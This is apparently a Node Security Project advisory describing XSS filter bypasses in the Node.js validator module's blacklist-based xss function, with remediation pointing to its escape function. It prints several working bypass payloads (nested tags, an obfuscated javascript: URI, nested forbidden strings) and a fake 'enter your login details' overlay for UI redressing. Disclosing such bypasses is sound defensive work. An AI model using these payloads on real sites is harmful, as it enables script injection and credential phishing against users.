## Overview
The validator module for Node.js contains functionality meant to filter potential XSS attacks (a filter called xss). Several ways to bypass the filter were discovered. In general, because the function’s filtering is blacklist-based it is likely that other bypasses will be discovered in the future. Developers are encouraged not to use the xss filter function in this package.

_Source: [Node Security Project](https://nodesecurity.io/advisories/41)_

### Details
Various inputs that could bypass the filter were discovered:

Improper parsing of nested tags:

```
<s <onmouseover="alert(1)"> <;s onmouseover="alert(1)">This is a test</s>
```

Incomplete filtering of javascript: URIs:

```
<a href="javascriptJ a V a S c R iPt::alert(1)" "<s>">test</a>
```

UI Redressing:

```
<div style="z-index: 9999999; background-color: green; width: 100%; height: 100%">
<h1>You have won</h1>Please click the link and enter your login details:
<a href="http://example.com/">http://good.com</a>
</div>
```

Bypass via Nested Forbidden Strings:

```
<scrRedirecRedirect 302t 302ipt type="text/javascript">prompt(1);</scrRedirecRedirect 302t 302ipt>
```

Additional bypasses were discovered by Krzysztof Kotowicz in 2012 when auditing CodeIgniter's XSS filtering function, which this code was based off of.

## Remediation
If you are a developer currently using the xss filter function from the validator package, you should consider replacing it with the escape filter function from the same package. This function replaces all instances of angle brackets (<, >), ampersands, and quotation marks, so no HTML tags will be processed.

## References

- [XSS Filter Bypass in validator Node.js Module](https://nealpoole.com/blog/2013/07/xss-filter-bypass-in-validator-nodejs-module/)
- [CodeIgniter <= 2.1.1 xss_clean() Cross Site Scripting filter bypass](http://blog.kotowicz.net/2012/07/codeigniter-210-xssclean-cross-site.html)
